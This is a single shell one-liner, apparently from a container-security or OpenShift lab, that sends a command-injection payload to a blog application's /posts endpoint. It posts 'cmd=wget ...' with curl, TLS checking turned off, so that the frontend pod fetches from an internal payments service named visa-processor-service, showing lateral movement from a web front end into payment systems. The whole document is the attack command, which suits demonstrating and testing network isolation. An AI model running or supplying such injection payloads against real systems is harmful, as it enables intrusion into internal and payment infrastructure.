echo "Connecting to VISA-PROCESSOR.." && curl -k -X POST -d 'cmd=wget -O - http://visa-processor-service.payments:8080' https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/posts
